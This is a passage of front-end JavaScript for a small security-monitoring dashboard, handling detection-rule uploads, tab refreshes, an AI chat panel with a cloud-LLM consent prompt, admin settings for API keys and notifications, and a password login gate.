  const text = await file.text();
  const isYaml = file.name.endsWith('.yaml') || file.name.endsWith('.yml');

  const r = await fetch(BASE + '/api/rules/upload', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({content: text, format: isYaml ? 'yaml' : 'json', pack_name: packName})
  });
  const d = await r.json();
  if (d.error) {
    msg.style.display = '';
    msg.style.color = '#e74c3c';
    msg.textContent = d.error;
  } else {
    msg.style.display = '';
    msg.style.color = '#27ae60';
    let result = `Added ${d.added} rule(s)`;
    if (d.skipped > 0) result += `, skipped ${d.skipped}`;
    msg.textContent = result;
    fileInput.value = '';
    setTimeout(() => { toggleRuleUpload(); msg.style.display = 'none'; }, 2000);
    loadRules();
  }
}

async function toggleCustomRule(ruleId) {
  await fetch(BASE + `/api/rules/${encodeURIComponent(ruleId)}/toggle`, {method: 'POST'});
  loadRules();
}

async function deleteCustomRule(ruleId) {
  if (!confirm(`Delete custom rule "${ruleId}"? This cannot be undone.`)) return;
  await fetch(BASE + `/api/rules/${encodeURIComponent(ruleId)}`, {method: 'DELETE'});
  loadRules();
}

function testRuleInExplorer(idx) {
  const rule = _rulesCache[idx];
  if (!rule) return;
  // Set Event Explorer to the rule's index and KQL
  document.getElementById('eventIndex').value = rule.index || 'tinysocs-winlog-*';
  document.getElementById('eventQuery').value = rule.kql || '';
  document.getElementById('eventTimeRange').value = '24h';
  loadEvents();
  const explorer = document.getElementById('event-explorer-card');
  ensureCardVisible('explorer');
  if (explorer) explorer.scrollIntoView({behavior: 'smooth', block: 'start'});
}

function refreshAll() {
  const updateEl = document.getElementById('lastUpdate');
  updateEl.textContent = 'Refreshing...';
  _tabLoaded = {};  // allow data reload
  // Safety timeout: if refresh hangs for 30s, clear the "Refreshing..." text
  const safetyTimer = setTimeout(() => {
    if (updateEl.textContent === 'Refreshing...') {
      updateEl.textContent = 'Update timed out \u2014 ' + new Date().toLocaleTimeString();
    }
  }, 30000);
  try {
    // Only refresh widgets on the active tab
    const tasks = [];
    switch(_activeTab) {
      case 'sites':
        tasks.push(loadSites());
        break;
      case 'overview':
        tasks.push(loadSummary(), loadTimeline(), loadDetections(), loadStorage());
        if (_sitesVisible) { _sitesCache = null; tasks.push(loadOverviewAggregate()); }
        break;
      case 'fleet':
        tasks.push(loadFleet());
        break;
      case 'data':
        if (_eventsLive) tasks.push(loadEvents(true));
        break;
      case 'detections':
        tasks.push(loadRules());
        break;
      case 'compliance':
        tasks.push(loadComplianceReport(), loadMitreCoverage());
        break;
    }
    _tabLoaded[_activeTab] = true;
    Promise.all(tasks)
      .then(() => {
        _initialLoadComplete = true;
        updateEl.textContent = 'Updated ' + new Date().toLocaleTimeString();
      })
      .catch(() => {
        updateEl.textContent = 'SIEM not connected \u2014 ' + new Date().toLocaleTimeString();
      })
      .finally(() => { clearTimeout(safetyTimer); });
  } catch(e) {
    clearTimeout(safetyTimer);
    updateEl.textContent = 'Refresh error \u2014 ' + new Date().toLocaleTimeString();
  }
}

// ---- Utility ----
function escapeHtml(text) {
  if (!text) return '';
  const div = document.createElement('div');
  div.textContent = String(text);
  return div.innerHTML;
}

// ---- Chat (with persistence) ----
let chatSessionId = null;

function _saveChatLocal() {
  // Save chat state to localStorage so it survives page refreshes
  try {
    const el = document.getElementById('chatMessages');
    localStorage.setItem('tinysocs_chat_session', chatSessionId || '');
    localStorage.setItem('tinysocs_chat_html', el.innerHTML);
  } catch(e) { /* localStorage may be unavailable */ }
}

async function restoreChat() {
  // Try to restore chat from localStorage, but verify session still exists on server
  try {
    const savedId = localStorage.getItem('tinysocs_chat_session');
    const savedHtml = localStorage.getItem('tinysocs_chat_html');
    if (savedId && savedHtml) {
      // Verify session exists on server (may have been wiped by reinstall)
      const check = await fetchJSON(`/api/chat/history?session_id=${encodeURIComponent(savedId)}`);
      if (check.messages && check.messages.length > 0) {
        chatSessionId = savedId;
        document.getElementById('chatMessages').innerHTML = savedHtml;
        const el = document.getElementById('chatMessages');
        el.scrollTop = el.scrollHeight;
        return;
      } else {
        // Server doesn't have this session — clear stale localStorage
        localStorage.removeItem('tinysocs_chat_session');
        localStorage.removeItem('tinysocs_chat_html');
      }
    }
  } catch(e) { /* ignore */ }

  // No local cache — check server for recent sessions
  try {
    const d = await fetchJSON('/api/chat/sessions');
    if (d.sessions && d.sessions.length > 0) {
      const latest = d.sessions[d.sessions.length - 1];
      const hist = await fetchJSON(`/api/chat/history?session_id=${encodeURIComponent(latest.session_id)}`);
      if (hist.messages && hist.messages.length > 0) {
        chatSessionId = latest.session_id;
        const el = document.getElementById('chatMessages');
        el.innerHTML = '';
        for (const m of hist.messages) {
          el.innerHTML += `<div class="chat-msg ${m.role}">${escapeHtml(m.content)}</div>`;
        }
        el.scrollTop = el.scrollHeight;
        _saveChatLocal();
      }
    }
  } catch(e) { /* server may not have history */ }

  // No prior session restored — scroll the default welcome message to top
  const el = document.getElementById('chatMessages');
  if (el) el.scrollTop = 0;
}

function clearChat() {
  chatSessionId = null;
  const el = document.getElementById('chatMessages');
  el.innerHTML = '<div class="chat-msg assistant">Hi! I\\\'m your TinySocs assistant. I can help you understand alerts, search through your logs, and guide you through any security concerns. Just ask me anything in plain English \u2014 no technical knowledge needed.</div>';
  try {
    localStorage.removeItem('tinysocs_chat_session');
    localStorage.removeItem('tinysocs_chat_html');
  } catch(e) {}
}

// ---- LLM Privacy Consent ----
let _llmMode = null;
let _llmIsCloud = false;

async function initLlmMode() {
  try {
    const r = await fetch(BASE + '/api/settings/llm-mode');
    const d = await r.json();
    _llmMode = d.mode;
    _llmIsCloud = d.is_cloud;
    const label = document.getElementById('llmModeLabel');
    if (label) {
      if (d.is_cloud) {
        label.innerHTML = '&#x1F512; via ' + escapeHtml(d.label);
        label.title = 'Data is sent to ' + d.label + ' API for analysis';
        label.style.color = 'var(--orange)';
      } else if (d.mode === 'ollama') {
        label.innerHTML = '&#x1F3E0; Local';
        label.title = 'All processing happens locally — no data leaves this machine';
        label.style.color = 'var(--green)';
      } else {
        label.innerHTML = '&#x26A1; Offline';
        label.title = 'No LLM configured';
        label.style.color = 'var(--muted)';
      }
    }
  } catch(e) {}
}

function checkLlmConsent() {
  if (!_llmIsCloud) return true;
  const consent = localStorage.getItem('tinysocs_llm_consent');
  if (consent) {
    try {
      const c = JSON.parse(consent);
      if (c.mode === _llmMode && c.accepted) return true;
    } catch(e) {}
  }
  // Show consent overlay
  const overlay = document.getElementById('llmConsentOverlay');
  const provider = document.getElementById('consentProvider');
  if (provider) provider.textContent = _llmMode === 'anthropic' ? 'Anthropic (Claude)' : 'OpenAI';
  if (overlay) overlay.style.display = 'block';
  return false;
}

function acceptLlmConsent() {
  localStorage.setItem('tinysocs_llm_consent', JSON.stringify({mode: _llmMode, accepted: true, ts: Date.now()}));
  const overlay = document.getElementById('llmConsentOverlay');
  if (overlay) overlay.style.display = 'none';
}

function declineLlmConsent() {
  const overlay = document.getElementById('llmConsentOverlay');
  if (overlay) overlay.style.display = 'none';
}

async function sendChat() {
  const input = document.getElementById('chatInput');
  const msg = input.value.trim();
  if (!msg) return;

  // Check privacy consent for cloud LLM modes
  if (!checkLlmConsent()) return;

  const el = document.getElementById('chatMessages');
  el.innerHTML += `<div class="chat-msg user">${escapeHtml(msg)}</div>`;
  input.value = '';
  input.disabled = true;

  el.innerHTML += '<div class="chat-msg assistant" id="chatLoading" style="color:var(--muted);font-style:italic">Thinking...</div>';
  el.scrollTop = el.scrollHeight;

  try {
    const body = {message: msg};
    if (chatSessionId) body.session_id = chatSessionId;

    const r = await fetch(BASE + '/api/chat', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(body),
    });
    const d = await r.json();

    const loader = document.getElementById('chatLoading');
    if (loader) loader.remove();

    if (d.error) {
      el.innerHTML += `<div class="chat-msg assistant" style="color:var(--red)">${escapeHtml(d.error)}</div>`;
    } else {
      chatSessionId = d.session_id;
      if (d.tool_calls && d.tool_calls.length) {
        for (const tc of d.tool_calls) {
          el.innerHTML += `<div class="chat-msg tool-info">Tool: ${escapeHtml(tc.tool)}(${escapeHtml(JSON.stringify(tc.input)).substring(0,200)})</div>`;
        }
      }
      el.innerHTML += `<div class="chat-msg assistant">${escapeHtml(d.reply)}</div>`;
      // Refresh detections in case the assistant changed something
      loadDetections();
    }
  } catch(e) {
    const loader = document.getElementById('chatLoading');
    if (loader) loader.remove();
    el.innerHTML += `<div class="chat-msg assistant" style="color:var(--red)">Error: ${escapeHtml(e.message)}</div>`;
  }

  input.disabled = false;
  input.focus();
  el.scrollTop = el.scrollHeight;
  _saveChatLocal();
}

// ---- Settings ----
let settingsPassword = null;

async function openSettings() {
  document.getElementById('settingsOverlay').classList.add('open');
  settingsPassword = null;
  // Hide all views first
  document.getElementById('settingsLogin').style.display = 'none';
  document.getElementById('settingsSetup').style.display = 'none';
  document.getElementById('settingsForm').style.display = 'none';

  // Check if password is configured
  try {
    const r = await fetch(BASE + '/api/settings/password-status');
    const d = await r.json();
    if (!d.configured) {
      // No password set — show first-time setup
      document.getElementById('settingsSetup').style.display = 'block';
      document.getElementById('setupPassword').value = '';
      document.getElementById('setupPasswordConfirm').value = '';
      document.getElementById('setupError').innerHTML = '';
      setTimeout(() => document.getElementById('setupPassword').focus(), 100);
      return;
    }
  } catch(e) { /* fall through to login */ }

  // Password is set — show login
  document.getElementById('settingsLogin').style.display = 'block';
  document.getElementById('adminPassword').value = '';
  document.getElementById('settingsLoginError').innerHTML = '';
  setTimeout(() => document.getElementById('adminPassword').focus(), 100);
}

function closeSettings() {
  settingsPassword = null;
  document.getElementById('settingsOverlay').classList.remove('open');
}

async function submitSetupPassword() {
  const pw = document.getElementById('setupPassword').value;
  const confirm = document.getElementById('setupPasswordConfirm').value;
  const errEl = document.getElementById('setupError');

  if (!pw || pw.length < 8) {
    errEl.innerHTML = '<div class="status-msg err" style="margin-top:8px">Password must be at least 8 characters.</div>';
    return;
  }
  if (pw !== confirm) {
    errEl.innerHTML = '<div class="status-msg err" style="margin-top:8px">Passwords do not match.</div>';
    return;
  }

  try {
    const r = await fetch(BASE + '/api/settings/setup-password', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({new_password: pw}),
    });
    const d = await r.json();
    if (d.error) {
      errEl.innerHTML = `<div class="status-msg err" style="margin-top:8px">${escapeHtml(d.error)}</div>`;
      return;
    }
    // Password set — now authenticate and show settings
    settingsPassword = pw;
    document.getElementById('settingsSetup').style.display = 'none';
    errEl.innerHTML = '';
    // Load settings with new password
    const r2 = await fetch(BASE + '/api/settings?admin_password=' + encodeURIComponent(pw));
    const d2 = await r2.json();
    if (!d2.error) {
      document.getElementById('settingsForm').style.display = 'block';
      populateSettings(d2);
    }
  } catch(e) {
    errEl.innerHTML = `<div class="status-msg err" style="margin-top:8px">${escapeHtml(e.message)}</div>`;
  }
}

async function settingsAuth() {
  const pw = document.getElementById('adminPassword').value;
  if (!pw) return;
  try {
    const r = await fetch(BASE + '/api/settings?admin_password=' + encodeURIComponent(pw));
    const d = await r.json();
    if (d.error) {
      const msg = d.error === 'password_not_set' ? 'No password configured.' : d.error;
      document.getElementById('settingsLoginError').innerHTML = `<div class="status-msg err" style="margin-top:8px">${escapeHtml(msg)}</div>`;
      return;
    }
    settingsPassword = pw;
    document.getElementById('settingsLogin').style.display = 'none';
    document.getElementById('settingsForm').style.display = 'block';
    populateSettings(d);
  } catch(e) {
    document.getElementById('settingsLoginError').innerHTML = `<div class="status-msg err" style="margin-top:8px">${escapeHtml(e.message)}</div>`;
  }
}

async function changePassword() {
  const current = document.getElementById('pw_current').value;
  const newPw = document.getElementById('pw_new').value;
  const confirm = document.getElementById('pw_confirm').value;
  const statusEl = document.getElementById('changePasswordStatus');

  if (!current) { statusEl.innerHTML = '<div class="status-msg err">Enter current password.</div>'; return; }
  if (!newPw || newPw.length < 8) { statusEl.innerHTML = '<div class="status-msg err">New password must be at least 8 characters.</div>'; return; }
  if (newPw !== confirm) { statusEl.innerHTML = '<div class="status-msg err">Passwords do not match.</div>'; return; }

  try {
    const r = await fetch(BASE + '/api/settings/change-password', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({old_password: current, new_password: newPw}),
    });
    const d = await r.json();
    if (d.error) {
      statusEl.innerHTML = `<div class="status-msg err">${escapeHtml(d.error)}</div>`;
      return;
    }
    settingsPassword = newPw;
    statusEl.innerHTML = `<div class="status-msg ok">${escapeHtml(d.message)}</div>`;
    document.getElementById('pw_current').value = '';
    document.getElementById('pw_new').value = '';
    document.getElementById('pw_confirm').value = '';
  } catch(e) {
    statusEl.innerHTML = `<div class="status-msg err">${escapeHtml(e.message)}</div>`;
  }
}

async function loadSettings() {
  try {
    const r = await fetch(BASE + '/api/settings?admin_password=' + encodeURIComponent(settingsPassword));
    const d = await r.json();
    if (d.error) {
      settingsPassword = null;
      openSettings();
      return;
    }
    document.getElementById('settingsLogin').style.display = 'none';
    document.getElementById('settingsForm').style.display = 'block';
    populateSettings(d);
  } catch(e) {
    document.getElementById('settingsStatus').innerHTML = `<div class="status-msg err">${escapeHtml(e.message)}</div>`;
  }
}

function populateSettings(d) {
  const s = d.settings || {};
  // SIEM_PASS excluded — field always starts blank (password type, never pre-filled)
  const fields = ['LLM_MODE','OPENAI_API_KEY','OPENAI_MODEL','ANTHROPIC_API_KEY','ANTHROPIC_MODEL',
    'OFFLINE_LLM_URL','OFFLINE_LLM_MODEL','WEBHOOK_URL','WEBHOOK_ENABLED',
    'SIEM_URL','SIEM_USER',
    'ABUSEIPDB_API_KEY','OTX_API_KEY','GREYNOISE_API_KEY',
    'WINLOG_RETENTION_DAYS','ALERT_RETENTION_DAYS','CUSTOM_RETENTION_DAYS'];
  for (const f of fields) {
    const el = document.getElementById('s_' + f);
    if (el) {
      if (el.tagName === 'SELECT') {
        el.value = s[f] || el.options[0].value;
      } else {
        el.value = s[f] || '';
      }
    }
  }
  // Set retention defaults if not configured
  if (!s['WINLOG_RETENTION_DAYS']) { const el = document.getElementById('s_WINLOG_RETENTION_DAYS'); if (el) el.value = '30'; }
  if (!s['ALERT_RETENTION_DAYS']) { const el = document.getElementById('s_ALERT_RETENTION_DAYS'); if (el) el.value = '90'; }
  if (!s['CUSTOM_RETENTION_DAYS']) { const el = document.getElementById('s_CUSTOM_RETENTION_DAYS'); if (el) el.value = '30'; }
  updateProviderFields();
  document.getElementById('settingsStatus').innerHTML = '';
  // Load email notification settings from agent-config.yml
  loadNotificationSettings();
}

async function loadNotificationSettings() {
  try {
    const r = await fetch(BASE + '/api/settings/notifications?admin_password=' + encodeURIComponent(settingsPassword));
    const d = await r.json();
    if (d.error) return;
    const map = {EMAIL_SMTP_HOST: 'email_smtp_host', EMAIL_SMTP_PORT: 'email_smtp_port',
                 EMAIL_FROM: 'email_from', EMAIL_TO: 'email_to'};
    for (const [elId, key] of Object.entries(map)) {
      const el = document.getElementById('s_' + elId);
      if (el && d[key] !== undefined) el.value = d[key];
    }
    // Also populate webhook URL from agent-config if the assistant.env one is empty
    const whEl = document.getElementById('s_WEBHOOK_URL');
    if (whEl && !whEl.value && d.webhook_url) whEl.value = d.webhook_url;
  } catch(e) { /* non-fatal */ }
}

function updateProviderFields() {
  const mode = document.getElementById('s_LLM_MODE').value;
  document.getElementById('field_openai').style.display = mode === 'openai' ? 'block' : 'none';
  document.getElementById('field_anthropic').style.display = mode === 'anthropic' ? 'block' : 'none';
  document.getElementById('field_ollama').style.display = (mode === 'ollama' || mode === 'offline') ? 'block' : 'none';
}
// Bind the change event
document.getElementById('s_LLM_MODE')?.addEventListener('change', updateProviderFields);

async function saveSettings() {
  const fields = ['LLM_MODE','OPENAI_API_KEY','OPENAI_MODEL','ANTHROPIC_API_KEY','ANTHROPIC_MODEL',
    'OFFLINE_LLM_URL','OFFLINE_LLM_MODEL','WEBHOOK_URL','WEBHOOK_ENABLED',
    'SIEM_URL','SIEM_USER','SIEM_PASS',
    'ABUSEIPDB_API_KEY','OTX_API_KEY','GREYNOISE_API_KEY'];
  const settings = {};
  for (const f of fields) {
    const el = document.getElementById('s_' + f);
    if (el) settings[f] = el.value;
  }

  const statusEl = document.getElementById('settingsStatus');
  statusEl.innerHTML = '<div class="status-msg" style="color:var(--muted)">Saving...</div>';

  try {
    // Save assistant.env settings
    const r = await fetch(BASE + '/api/settings', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({admin_password: settingsPassword, settings}),
    });
    const d = await r.json();

    // Also save notification settings to agent-config.yml
    const notifSettings = {
      webhook_url: document.getElementById('s_WEBHOOK_URL')?.value || '',
      email_smtp_host: document.getElementById('s_EMAIL_SMTP_HOST')?.value || '',
      email_smtp_port: document.getElementById('s_EMAIL_SMTP_PORT')?.value || '587',
      email_from: document.getElementById('s_EMAIL_FROM')?.value || '',
      email_to: document.getElementById('s_EMAIL_TO')?.value || '',
    };
    const r2 = await fetch(BASE + '/api/settings/notifications', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({admin_password: settingsPassword, settings: notifSettings}),
    });
    const d2 = await r2.json();

    if (d.error) {
      statusEl.innerHTML = `<div class="status-msg err">${escapeHtml(d.error)}</div>`;
    } else {
      const msg = d2.error ? d.message + ' (Warning: notification save failed)' : d.message;
      statusEl.innerHTML = `<div class="status-msg ok">${escapeHtml(msg)}</div>`;
      setTimeout(() => closeSettings(), 1200);
    }
  } catch(e) {
    statusEl.innerHTML = `<div class="status-msg err">${escapeHtml(e.message)}</div>`;
  }
}

async function saveRetentionSettings() {
  const winlog = parseInt(document.getElementById('s_WINLOG_RETENTION_DAYS')?.value || '30');
  const alerts = parseInt(document.getElementById('s_ALERT_RETENTION_DAYS')?.value || '90');
  const custom = parseInt(document.getElementById('s_CUSTOM_RETENTION_DAYS')?.value || '30');
  const statusEl = document.getElementById('retentionStatus');
  if (winlog < 7 || winlog > 365 || alerts < 7 || alerts > 365 || custom < 7 || custom > 365) {
    statusEl.innerHTML = '<span style="color:var(--red)">Values must be 7\u2013365 days</span>';
    return;
  }
  statusEl.innerHTML = '<span style="color:var(--muted)">Saving...</span>';
  try {
    const r = await fetch(BASE + '/api/settings/retention', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({admin_password: settingsPassword, winlog_days: winlog, alert_days: alerts, custom_days: custom}),
    });
    const d = await r.json();
    if (d.ok) {
      statusEl.innerHTML = '<span style="color:var(--green)">Saved \\u2714</span>';
      setTimeout(() => { statusEl.innerHTML = ''; }, 3000);
    } else {
      statusEl.innerHTML = `<span style="color:var(--red)">${escapeHtml(d.error || 'Failed')}</span>`;
    }
  } catch(e) {
    statusEl.innerHTML = `<span style="color:var(--red)">${escapeHtml(e.message)}</span>`;
  }
}

async function testWebhook() {
  const statusEl = document.getElementById('webhookTestStatus');
  const url = document.getElementById('s_WEBHOOK_URL')?.value || '';
  statusEl.innerHTML = '<span style="color:var(--muted)">Testing...</span>';
  try {
    const r = await fetch(BASE + '/api/settings/test-webhook', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({admin_password: settingsPassword, webhook_url: url}),
    });
    const d = await r.json();
    if (d.ok) {
      statusEl.innerHTML = `<span style="color:var(--green)">${escapeHtml(d.message)}</span>`;
    } else {
      statusEl.innerHTML = `<span style="color:var(--red)">${escapeHtml(d.error)}</span>`;
    }
  } catch(e) {
    statusEl.innerHTML = `<span style="color:var(--red)">${escapeHtml(e.message)}</span>`;
  }
}

async function testEmail() {
  const statusEl = document.getElementById('emailTestStatus');
  statusEl.innerHTML = '<span style="color:var(--muted)">Sending test email...</span>';
  try {
    const r = await fetch(BASE + '/api/settings/test-email', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        admin_password: settingsPassword,
        smtp_host: document.getElementById('s_EMAIL_SMTP_HOST')?.value || '',
        smtp_port: document.getElementById('s_EMAIL_SMTP_PORT')?.value || '587',
        email_from: document.getElementById('s_EMAIL_FROM')?.value || '',
        email_to: document.getElementById('s_EMAIL_TO')?.value || '',
      }),
    });
    const d = await r.json();
    if (d.ok) {
      statusEl.innerHTML = `<span style="color:var(--green)">${escapeHtml(d.message)}</span>`;
    } else {
      statusEl.innerHTML = `<span style="color:var(--red)">${escapeHtml(d.error)}</span>`;
    }
  } catch(e) {
    statusEl.innerHTML = `<span style="color:var(--red)">${escapeHtml(e.message)}</span>`;
  }
}

async function testThreatIntel() {
  const statusEl = document.getElementById('threatIntelTestStatus');
  statusEl.innerHTML = '<span style="color:var(--muted)">Testing providers...</span>';
  try {
    const r = await fetch(BASE + '/api/threat-intel/test', {method: 'POST'});
    const d = await r.json();
    if (d.ok) {
      const parts = [];
      for (const [name, info] of Object.entries(d.results || {})) {
        if (info.status === 'ok') parts.push(`<span style="color:var(--green)">${escapeHtml(name)}: OK (${info.quota_remaining} remaining)</span>`);
        else if (info.status === 'not_configured') parts.push(`<span style="color:var(--muted)">${escapeHtml(name)}: not configured</span>`);
        else parts.push(`<span style="color:var(--red)">${escapeHtml(name)}: ${escapeHtml(info.error || info.status)}</span>`);
      }
      statusEl.innerHTML = parts.join(' &bull; ');
    } else {
      statusEl.innerHTML = `<span style="color:var(--red)">${escapeHtml(d.error)}</span>`;
    }
  } catch(e) {
    statusEl.innerHTML = `<span style="color:var(--red)">${escapeHtml(e.message)}</span>`;
  }
}

// ---- LLM status tracking ----
let _llmConfigured = true;  // assume yes until checked
let _llmReason = '';

async function checkLlmStatus() {
  try {
    const d = await fetchJSON('/api/llm/status');
    _llmConfigured = d.configured === true;
    _llmReason = d.reason || '';

    // Update chat welcome message
    const chatEl = document.getElementById('chatMessages');
    if (!_llmConfigured && chatEl) {
      chatEl.innerHTML = '<div class="chat-msg assistant">' +
        'AI assistant is not configured. All dashboard data panels work without AI.' +
        '<br><br>To enable the assistant, open Settings (gear icon) and configure an LLM provider.' +
        '</div>';
      const chatInput = document.getElementById('chatInput');
      if (chatInput) { chatInput.placeholder = 'AI not configured \u2014 open Settings to enable'; }
    }
  } catch(e) { /* keep defaults */ }
}

// ---- Collapsible Assistant ----
function toggleAssistant() {
  const panel = document.getElementById('rightPanel');
  const left = document.querySelector('.left-panels');
  const btn = document.getElementById('assistantToggle');
  const collapsed = panel.classList.toggle('collapsed');
  left.classList.toggle('expanded', collapsed);
  btn.innerHTML = collapsed ? '&raquo;' : '&laquo;';
  btn.title = collapsed ? 'Show assistant' : 'Hide assistant';
  try { localStorage.setItem('tinysocs_assistant_collapsed', collapsed ? '1' : ''); } catch(e) {}
}
function restoreAssistantState() {
  try {
    if (localStorage.getItem('tinysocs_assistant_collapsed') === '1') {
      const panel = document.getElementById('rightPanel');
      const left = document.querySelector('.left-panels');
      const btn = document.getElementById('assistantToggle');
      panel.classList.add('collapsed');
      left.classList.add('expanded');
      btn.innerHTML = '&raquo;';
      btn.title = 'Show assistant';
    }
  } catch(e) {}
}

// Align assistant panel with the first card row (never above the header)
function alignAssistantPanel() {
  const header = document.querySelector('.header');
  const panel = document.getElementById('rightPanel');
  if (!panel) return;
  // Try first card, then active tab pane as fallback (e.g. Sites tab has no .card)
  let anchor = document.querySelector('.left-panels .tab-pane.active .card') ||
               document.querySelector('.left-panels .tab-pane.active');
  const minTop = header ? header.getBoundingClientRect().bottom : 0;
  if (anchor) {
    const rect = anchor.getBoundingClientRect();
    panel.style.top = Math.max(rect.top, minTop) + 'px';
  } else {
    panel.style.top = minTop + 'px';
  }
}

// Start up — dashboard is behind login gate; don't load data until authed
restoreAssistantState();
alignAssistantPanel();
window.addEventListener('resize', alignAssistantPanel);
window.addEventListener('scroll', alignAssistantPanel);

//// ---- M0: Dashboard Login Gate ----
let _authToken = null;
let _dashboardUnlocked = false;

async function doLogin() {
  const errEl = document.getElementById('loginError');
  try {
    const pw = document.getElementById('loginPassword').value;
    errEl.textContent = '';
    if (!pw) { errEl.textContent = 'Please enter a password'; return; }
    errEl.textContent = 'Signing in\u2026';
    const url = BASE + '/api/auth/login';
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 15000);
    let r;
    try {
      r = await fetch(url, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({password: pw}),
        signal: controller.signal,
      });
    } finally { clearTimeout(timeout); }
    if (!r.ok) { errEl.textContent = 'Login failed (HTTP ' + r.status + ')'; return; }
    const d = await r.json();
    if (d.error) { errEl.textContent = d.error; return; }
    _authToken = d.token;
    try { sessionStorage.setItem('tinysocs_auth', _authToken); } catch(e) {}
    unlockDashboard();
  } catch(e) {
    var msg = e.name === 'AbortError' ? 'Login timed out — please try again' : 'Login error: ' + (e.message || String(e));
    if (errEl) errEl.textContent = msg;
  }
}

function unlockDashboard() {
  if (_dashboardUnlocked) return;
  _dashboardUnlocked = true;
  document.getElementById('loginGate').style.display = 'none';
  document.getElementById('dashboardContent').style.visibility = 'visible';
  try { checkLlmStatus(); } catch(e) {}
  try { restoreChat(); } catch(e) {}
  try { initLlmMode(); } catch(e) {}

  // Restore active tab from URL hash only (not localStorage — it persists
  // across reinstalls and causes stale tab selection)
  var origHash = window.location.hash.replace('#', '');
  _initialHashTab = origHash;
  var tab = _validTabs.includes(origHash) ? origHash : 'overview';
  switchTab(tab);

  // Phase 20: fetch local node ID for single-node site focus
  fetchJSON('/api/local-meta').then(m => { if (m && m.node_id) _localNodeId = m.node_id; }).catch(() => {});

  // Check if Sites tab should be shown
  try { initSitesTab(); } catch(e) {}

  // Eager-load all tabs in background so switching is instant
  _validTabs.forEach(function(t) { loadTabData(t); });

  // Phase 18 M3: restore focused site from sessionStorage
  try {
    var storedSite = sessionStorage.getItem('tinysocs_focused_site');
    if (storedSite) {
      _focusedSite = storedSite;
      var storedName = sessionStorage.getItem('tinysocs_focused_name') || storedSite;
      var banner = document.getElementById('siteFocusBanner');
      if (banner) banner.classList.add('visible');
      var label = document.getElementById('sfbSiteName');
      if (label) label.textContent = 'Viewing: ' + storedName;
      // Re-switch to the current tab to load site-specific data
      _tabLoaded = {};
      switchTab(tab);
    }
  } catch(e) {}
}

// Periodic data refresh (every 30s once unlocked)
setInterval(function() { if (_authToken && _dashboardUnlocked) { try { refreshAll(); } catch(e) {} } }, 30000);

async function checkExistingSession() {
  try { _authToken = sessionStorage.getItem('tinysocs_auth'); } catch(e) {}
  if (!_authToken) { showLoginGate(); return; }
  try {
    const r = await fetch(BASE + '/api/auth/check', {
      headers: {'Authorization': 'Bearer ' + _authToken},
    });
    if (r.ok) { unlockDashboard(); return; }
  } catch(e) {}
  _authToken = null;
  try { sessionStorage.removeItem('tinysocs_auth'); } catch(e) {}
  showLoginGate();
}

function showLoginGate() {
  document.getElementById('loginGate').style.display = 'flex';
  document.getElementById('dashboardContent').style.visibility = 'hidden';
  document.getElementById('loginPassword').value = '';
  setTimeout(function() { document.getElementById('loginPassword').focus(); }, 100);
}

function doLogout() {
  _authToken = null;
  _dashboardUnlocked = false;
  try { sessionStorage.removeItem('tinysocs_auth'); } catch(e) {}
  showLoginGate();
}

let _sessionExpiredShown = false;
function _handleSessionExpired() {
  // Avoid spamming the user with multiple prompts from parallel requests
  if (_sessionExpiredShown) return;
  _sessionExpiredShown = true;
  document.getElementById('lastUpdate').textContent = 'Session expired — please log in again';
  doLogout();
  _sessionExpiredShown = false;
}

async function changePassword() {
  const cur = document.getElementById('changePwCurrent').value;
  const newPw = document.getElementById('changePwNew').value;
  const confirm = document.getElementById('changePwConfirm').value;
  const statusEl = document.getElementById('changePwStatus');
  statusEl.innerHTML = '';
  if (!cur || !newPw) { statusEl.innerHTML = '<span style="color:var(--red)">All fields required</span>'; return; }
  if (newPw !== confirm) { statusEl.innerHTML = '<span style="color:var(--red)">New passwords do not match</span>'; return; }
  if (newPw.length < 8) { statusEl.innerHTML = '<span style="color:var(--red)">Password must be at least 8 characters</span>'; return; }
  try {
    const r = await fetch(BASE + '/api/auth/change-password', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({token: _authToken, current_password: cur, new_password: newPw}),
    });
    const d = await r.json();
    if (d.error) { statusEl.innerHTML = '<span style="color:var(--red)">' + escapeHtml(d.error) + '</span>'; return; }
    statusEl.innerHTML = '<span style="color:#27ae60">Password changed. Logging out...</span>';
    setTimeout(() => { closeSettings(); doLogout(); }, 1500);
  } catch(e) { statusEl.innerHTML = '<span style="color:var(--red)">' + escapeHtml(e.message) + '</span>'; }
}

// Override settings to use session token
const _origOpenSettings = openSettings;
openSettings = function() {
  document.getElementById('settingsOverlay').classList.add('open');
  // Clear stale status messages and password fields on every open
  ['changePwStatus','changePasswordStatus','settingsStatus','webhookTestStatus','emailTestStatus'].forEach(id => {
    const el = document.getElementById(id); if (el) el.innerHTML = '';
  });
  ['changePwCurrent','changePwNew','changePwConfirm'].forEach(id => {
    const el = document.getElementById(id); if (el) el.value = '';
  });
  if (_authToken) {
    // Skip password prompt — use session token
    (async () => {
      try {
        const r = await fetch(BASE + '/api/settings', { headers: {'Authorization': 'Bearer ' + _authToken} });
        const d = await r.json();
        if (!d.error) {
          settingsPassword = _authToken;
          document.getElementById('settingsLogin').style.display = 'none';
          document.getElementById('settingsForm').style.display = 'block';
          populateSettings(d);
          return;
        }
      } catch(e) {}
      _origOpenSettings();
    })();
  } else { _origOpenSettings(); }
};

// Override saveSettings to pass session token
const _origSaveSettings = saveSettings;
saveSettings = async function() {
  const fields = ['LLM_MODE','OPENAI_API_KEY','OPENAI_MODEL','ANTHROPIC_API_KEY','ANTHROPIC_MODEL',
    'OFFLINE_LLM_URL','OFFLINE_LLM_MODEL','WEBHOOK_URL','WEBHOOK_ENABLED',
    'SIEM_URL','SIEM_USER','SIEM_PASS',
